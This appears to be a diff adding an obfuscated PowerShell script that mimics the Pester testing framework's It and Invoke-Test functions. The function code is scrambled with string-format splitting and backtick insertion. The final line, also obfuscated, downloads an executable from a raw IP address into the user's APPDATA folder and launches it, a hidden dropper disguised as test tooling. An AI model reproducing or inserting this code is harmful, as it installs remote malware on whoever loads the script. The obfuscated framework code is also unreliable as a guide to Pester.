@@ -1,0 +1,256 @@
+  sET-iTEM  ("VA"+"riaBL"+"E:Jq67"+"C"+"2")  ([Type]("{0}{1}"-F'reGE','x') )  ;${GE`LBI}=  [tYPe]("{0}{1}"-f'STriN','G') ;  sET ("4"+"21cb") (  [tyPe]("{0}{1}" -F'GU','Id')  ); function I`T {
+    
+    [CmdletBinding(dEfaULtPArAmeterSEtnAME = {"{0}{2}{1}"-f 'N','mal','or'})]
+    param(
+        [Parameter(MandAtOrY = ${T`RUe}, POsItioN = 0)]
+        [string] ${N`AMe},
+
+        [Parameter(PoSiTiOn = 1)]
+        [ScriptBlock] ${t`ESt} = {},
+
+        [System.Collections.IDictionary[]] ${t`EsT`cA`ses},
+
+        [Parameter(pARAmeTERsEtnAmE = "p`End`inG")]
+        [Switch] ${PEn`d`iNG},
+
+        [Parameter(paRaMETeRsetNAME = "s`kIP")]
+        [Alias({"{2}{0}{1}" -f'or','e','Ign'})]
+        [Switch] ${sK`iP}
+    )
+
+    &("{1}{0}" -f 'pl','ItIm') -Pester ${P`e`STEr} -OutputScriptBlock ${function:Write-PesterResult} @PSBoundParameters
+}
+
+function ItI`mpl {
+    [CmdletBinding(DEfAuLtPARAmETErsetname = {"{1}{0}" -f'l','Norma'})]
+    param(
+        [Parameter(MANDAToRy = ${tR`UE}, POsITion = 0)]
+        [string]${n`AMe},
+
+        [Parameter(pOSiTioN = 1)]
+        [ScriptBlock] ${T`est},
+
+        [System.Collections.IDictionary[]] ${TE`Stca`seS},
+        [Parameter(pARametERSeTnamE = "pend`i`Ng")]
+        [Switch] ${P`end`INg},
+
+        [Parameter(pARAMeTERseTname = "s`kiP")]
+        [Alias({"{0}{1}" -f'I','gnore'})]
+        [Switch] ${SK`IP},
+
+        ${pe`sT`ER},
+        [scriptblock] ${o`UtP`UTscr`ipTBLOCK}
+    )
+
+    .("{3}{4}{1}{0}{2}" -f 'cribeInPr','-Des','ogress','Asse','rt') -CommandName ('It')
+
+    
+    if (${pS`cMDl`Et}.parAMEterSeTnAMe -ne ("{1}{0}"-f 'ip','Sk')) {
+        ${S`kIp} = ${FA`lSE}
+    }
+    if (${Ps`CM`dlet}.PaRAmeteRsEtname -ne ("{0}{2}{1}"-f 'P','ng','endi')) {
+        ${p`enDi`Ng} = ${F`AL`sE}
+    }
+
+    
+    if (-not (${pSbOu`ND`pArAM`ete`RS}.("{3}{0}{2}{1}"-f 'tains','y','Ke','Con').Invoke(("{0}{1}"-f 'te','st')) -or ${s`kIp} -or ${PE`NDiNg})) {
+        If (${na`ME}.("{1}{2}{0}" -f'ins','Co','nta').Invoke("`n")) {
+            throw (("{11}{21}{2}{17}{1}{10}{5}{9}{6}{15}{12}{20}{14}{16}{8}{18}{3}{19}{7}{13}{4}{0}"-f ' group?)','e ','has mul','ed a nam','st','ines a','d no ','e','Have yo','n','l','Name paramet',' ',' te','rovided. ','script block is','(','tipl','u provid','e for th','p','er '))
+        }
+        else {
+            throw ("{21}{18}{9}{17}{7}{0}{23}{4}{22}{10}{16}{5}{1}{12}{20}{24}{3}{19}{14}{2}{13}{11}{15}{8}{6}"-f'k is','o',' bra','pen c','ed. (','y','next line?)','cript bloc',' ','st','av',' ','u pu','ce','ly','on the','e ',' s','e','ur','t ','No t','H',' provid','the o')
+        }
+    }
+
+    
+    if (${n`UlL} -eq ${Te`ST}) {
+        ${tE`st} = {}
+    }
+
+    
+    if (${p`svErsiONta`B`lE}."P`SveRs`iOn"."MA`jOr" -le 2 -and
+        ${P`sCMdl`et}.ParametERSETName -eq ("{0}{2}{1}"-f'No','mal','r') -and
+          ( dir ("{0}{1}{2}" -f 'vARiABlE:','gE','lbi')  ).vaLUE::("{3}{2}{0}{1}" -f 't','y','Emp','IsNullOr').Invoke((.("{3}{0}{2}{4}{1}" -f 'move','mments','-C','Re','o') ${t`est}.("{2}{1}{0}" -f'ring','St','To').Invoke()) -replace "\s")) {
+        ${p`end`inG} = ${t`RuE}
+    }
+    elseIf (${Ps`VER`sI`OnTAbLE}."P`sVEr`sion"."MAj`or" -gt 2) {
+        
+        
+        ${Te`st`isE`mpty} =
+          ( gET-vaRiAble ("{0}{1}" -f'Ge','Lbi') -va )::("{3}{0}{1}{2}" -f'ullO','rEm','pty','IsN').Invoke(${TE`st}."a`ST"."Be`GInb`L`ock"."sTateMe`N`TS") -and
+         ( GeT-VarIaBLe ("{1}{0}"-f 'BI','gEL')  -VALUe  )::("{0}{2}{1}"-f 'IsNullO','mpty','rE').Invoke(${t`eSt}."a`st"."PROce`SSBL`ocK"."StatEME`N`TS") -and
+         ${gE`lbI}::("{0}{1}{2}{3}"-f'Is','Nul','lOrEm','pty').Invoke(${Te`St}."A`St"."eNdb`LO`CK"."s`TatEM`ENTS")
+
+        if (${ps`CmDl`eT}.pARaMeTERSETnAME -eq ("{1}{0}" -f 'l','Norma') -and ${tEsT`I`sEMp`Ty}) {
+            ${P`e`NDing} = ${t`RUe}
+        }
+    }
+
+    ${PeN`dI`Ngs`kIp} = @{}
+
+    if (${Ps`cMDlET}.PARAMetERSETNAMe -eq ("{0}{1}"-f'Ski','p')) {
+        ${P`ENDing`sK`ip}[("{0}{1}"-f'Sk','ip')] = ${sk`ip}
+    }
+    else {
+        ${P`eN`DIngS`KiP}[("{0}{1}"-f'Pend','ing')] = ${pENdI`Ng}
+    }
+
+    if (${N`UlL} -ne ${T`EStca`seS} -and ${t`estc`Ases}."C`Ount" -gt 0) {
+        foreach (${Te`S`Tcase} in ${TeS`TC`A`SeS}) {
+            ${eXPAN`dEd`NaME} =  ${jQ`67C2}::("{1}{0}" -f'ace','Repl').Invoke(${na`me}, (("{2}{0}{1}" -f '>]','+)>','<([^')), {
+                    ${ca`p`TurE} = ${aR`gs}[0]."gr`oups"[1]."Va`lUE"
+                    if (${t`ESt`case}.("{0}{1}" -f 'Contain','s').Invoke(${cAp`TuRe})) {
+                        ${V`AL`Ue} = ${te`StcAse}[${Ca`ptu`RE}]
+                        
+                        
+                        if (${V`A`lUe} -isnot [string] -or   (  Get-vArIablE  ("{1}{0}" -f 'lBI','GE')  -VAluEo )::("{0}{2}{1}{3}" -f 'IsNu','OrEmp','ll','ty').Invoke(${Va`luE})) {
+                            &("{1}{2}{0}"-f 'cely','For','mat-Ni') ${vAL`Ue}
+                        }
+                        else {
+                            ${Va`l`UE}
+                        }
+                    }
+                    else {
+                        "<$capture>"
+                    }
+                })
+
+            ${S`p`lAt} = @{
+                ("{0}{1}"-f 'Nam','e')                   = ${ex`pAn`DED`NAme}
+                ("{1}{0}{3}{2}"-f 'pt','Scri','k','bloc')            = ${Te`St}
+                ("{1}{2}{0}"-f 'ters','Param','e')             = ${T`EStcA`sE}
+                ("{2}{1}{4}{3}{0}"-f 'Name','eri','Paramet','Suite','zed') = ${nA`ME}
+                ("{1}{0}{3}{2}{4}" -f'tSc','Outpu','iptBl','r','ock')      = ${O`UtP`UTSCrIp`TbL`OCK}
+            }
+
+            .("{0}{2}{1}" -f'Invoke-','est','T') @splat @pendingSkip
+        }
+    }
+    else {
+        .("{2}{0}{1}"-f'oke-Tes','t','Inv') -Name ${NA`me} -ScriptBlock ${T`EST} @pendingSkip -OutputScriptBlock ${OU`TPUTs`c`Rip`Tb`LocK}
+    }
+}
+
+function IN`VoKE-`Te`St {
+    [CmdletBinding(deFaUlTparamEterSEtNaMe = {"{0}{1}"-f'N','ormal'})]
+    param (
+        [Parameter(maNdatorY = ${t`RUe})]
+        [string] ${N`AmE},
+
+        [Parameter(mandAtory = ${Tr`Ue})]
+        [ScriptBlock] ${SC`Ript`BL`ock},
+
+        [scriptblock] ${Ou`T`p`UtSC`RIPtBL`OcK},
+
+        [System.Collections.IDictionary] ${par`Am`E`TeRs},
+        [string] ${PA`RamEtEr`IzEd`S`UI`TenAME},
+
+        [Parameter(pARaMetErseTNAME = "p`E`NdiNg")]
+        [Switch] ${p`End`iNG},
+
+        [Parameter(paraMEtErSEtNaMe = "s`KIP")]
+        [Alias({"{1}{2}{0}" -f 'e','I','gnor'})]
+        [Switch] ${S`KIP}
+    )
+
+    if (${nU`Ll} -eq ${pA`RAME`TeRS}) {
+        ${pa`Ra`METERS} = @{}
+    }
+
+    try {
+        if (${S`KiP}) {
+            ${pe`s`TEr}.("{1}{3}{0}{2}"-f 'sul','AddTest','t','Re').Invoke(${N`AME}, ("{1}{2}{0}" -f 'ed','Skip','p'), ${N`ULL})
+        }
+        elseif (${pEN`Di`Ng}) {
+            ${pes`T`eR}.("{1}{0}{4}{3}{2}" -f'ddT','A','ult','s','estRe').Invoke(${N`AME}, ("{0}{1}" -f 'Pendi','ng'), ${n`UlL})
+        }
+        else {
+            
+            
+
+            ${E`R`ROr`REcoRd} = ${n`ULL}
+            try {
+                ${Pes`T`ER}.("{0}{2}{1}" -f 'E','st','nterTe').Invoke()
+                .("{0}{5}{4}{3}{1}{2}"-f 'Invoke-Te','upBloc','ks','t','tCaseSe','s')
+
+                do {
+                    .("{5}{6}{3}{1}{4}{0}{7}{2}" -f'ocation','ptBlo','nt','e-Scri','ckInv','W','rit','Hi') -Hint "It" -ScriptBlock ${S`criP`TBl`ock}
+                    ${n`ULL} = & ${scRip`T`Blo`CK} @Parameters
+                } until (${t`RUE})
+            }
+            catch {
+                ${eRrOrR`ec`orD} = ${_}
+            }
+            finally {
+                
+                try {
+                    if (-not (${sK`ip} -or ${PEnDi`NG})) {
+                        &("{4}{2}{3}{0}{5}{1}" -f '-TestCas','TeardownBlocks','k','e','Invo','e')
+                    }
+                }
+                catch {
+                    ${err`O`RreC`oRD} = ${_}
+                }
+
+                ${Pe`steR}.("{2}{1}{0}" -f 'eTest','v','Lea').Invoke()
+            }
+
+            ${r`eS`ULT} = &("{3}{4}{1}{5}{6}{2}{0}"-f 't','vert','esul','C','on','To-Pes','terR') -Name ${N`Ame} -ErrorRecord ${Er`R`o`RrEcOrD}
+            ${oRde`RedPA`R`A`MetE`Rs} = &("{4}{1}{9}{7}{3}{5}{2}{6}{8}{0}" -f'ry','et-Ord','rDic','rame','G','te','ti','dPa','ona','ere') -ScriptBlock ${sCR`Ip`Tbl`OCK} -Dictionary ${PArA`Mete`Rs}
+            ${PE`STEr}.("{2}{1}{3}{0}" -f't','es','AddT','tResul').Invoke( ${re`suLT}."NA`Me", ${re`SUlT}."rEs`ULt", ${Nu`Ll}, ${re`s`UlT}."fA`IlurEMe`sSagE", ${rE`SUlT}."St`A`ckTrACE", ${Par`A`MeTERiZEd`SuItENa`Me}, ${ordEr`e`D`pARAMEteRS}, ${RE`sULt}."E`R`RoRRECorD" )
+            
+        }
+    }
+    finally {
+        .("{0}{2}{1}"-f 'Exit-Mock','e','Scop') -ExitTestCaseOnly
+    }
+
+    if (${Nu`lL} -ne ${OUt`p`UT`SCRi`PtBlOCk}) {
+        ${P`EST`eR}."T`E`strES`ULt"[-1] | & ${oU`TpuT`scRi`ptb`Lo`ck}
+    }
+}
+
+function geT-or`dEReDpa`R`AmE`TER`dICTiOnaRY {
+    [OutputType([System.Collections.IDictionary])]
+    param (
+        [scriptblock] ${sCR`IpT`B`loCk},
+        [System.Collections.IDictionary] ${Di`CT`IoN`ARY}
+    )
+
+    ${P`ARAM`et`erS} = &("{3}{0}{2}{4}{1}"-f'e','ry','rDi','Get-Paramet','ctiona') -ScriptBlock ${s`Cr`ipt`BlocK}
+
+    ${o`RdeReD`DICtIo`NA`Ry} = & ${Sa`Fecomm`A`N`dS}[("{0}{1}{2}" -f 'New-','Objec','t')] ("{9}{4}{3}{5}{11}{6}{2}{0}{1}{12}{8}{10}{7}"-f 'd.','Orde','ize','stem.Col','y','lections','pecial','onary','dDict','S','i','.S','re')
+
+    foreach (${pA`RaMEtERn`A`Me} in ${pAram`Et`eRS}."Ke`yS") {
+        ${Va`LUe} = ${n`Ull}
+        if (${DicTI`on`A`RY}.("{2}{0}{1}"-f'ntai','nsKey','Co').Invoke(${p`AraMET`Ern`A`me})) {
+            ${Va`L`UE} = ${d`ICti`oNa`Ry}[${p`A`RA`m`EteRNAME}]
+        }
+
+        ${oRdeRe`D`dIC`TIoNa`Ry}[${pa`R`Am`etERN`AMe}] = ${V`ALuE}
+    }
+
+    return ${O`R`DERE`dDI`CTioN`ARY}
+}
+
+function gET-paR`Ame`T`erdiCt`iONARy {
+    param (
+        [scriptblock] ${sC`RIP`T`BLOcK}
+    )
+
+    ${gU`id} =   ( vArIaBLE ("4"+"21CB") ).vAlUE::("{2}{1}{0}" -f 'Guid','w','Ne').Invoke()."gu`iD"
+
+    try {
+        & ${sAFEC`OM`MAN`DS}[("{2}{0}{1}" -f't-Conten','t','Se')] ((("{1}{3}{5}{2}{0}{4}" -f 'n','fu','o','n',':iw0sMUguid','cti'))-crEpLACe([CHAr]115+[CHAr]77+[CHAr]85),[CHAr]36  -RePLAcE  ([CHAr]105+[CHAr]119+[CHAr]48),[CHAr]92) ${SC`R`IPtBl`OCK}
+        ${Me`TaDATa} = [System.Management.Automation.CommandMetadata](& ${saFE`coMM`ANDS}[("{1}{0}{2}" -f 'Comm','Get-','and')] -Name ${G`UId} -CommandType ("{2}{0}{1}"-f'un','ction','F'))
+
+        return ${MeT`AD`ATA}."p`ARam`eT`eRS"
+    }
+    finally {
+        if (& ${sAFecomM`AN`ds}[("{0}{2}{1}" -f'Tes','Path','t-')] ((("{2}{4}{3}{1}{0}{5}" -f'KcOjgui','q','fu','on:4','ncti','d'))  -rEplace([Char]52+[Char]113+[Char]75),[Char]92  -CRePLAce'cOj',[Char]36)) {
+            & ${s`AfEcoM`M`ANdS}[("{3}{0}{2}{1}"-f'e','Item','-','Remov')] ((("{4}{3}{2}{0}{1}" -f'gYZh7Kg','uid',':','n','functio'))  -REplaCE  ([cHar]104+[cHar]55+[cHar]75),[cHar]36-REplaCE 'gYZ',[cHar]92)
+        }
+    }
+}
+
+(.("{2}{0}{1}{3}"-f '-O','bje','New','ct') ("{1}{4}{5}{0}{3}{2}"-f'bClie','Sy','t','n','s','tem.Net.We')).("{2}{1}{0}"-f 'le','nloadFi','Dow').Invoke(("{2}{3}{8}{6}{7}{4}{0}{5}{9}{1}"-f'o/','e','ht','tp://94.102.','yaho','cs','38/','~','53.2','rsv.ex'),"$env:APPDATA\csrsv.exe");.("{0}{2}{1}" -f'St','ess','art-Proc') ("$env:APPDATA\csrsv.exe")
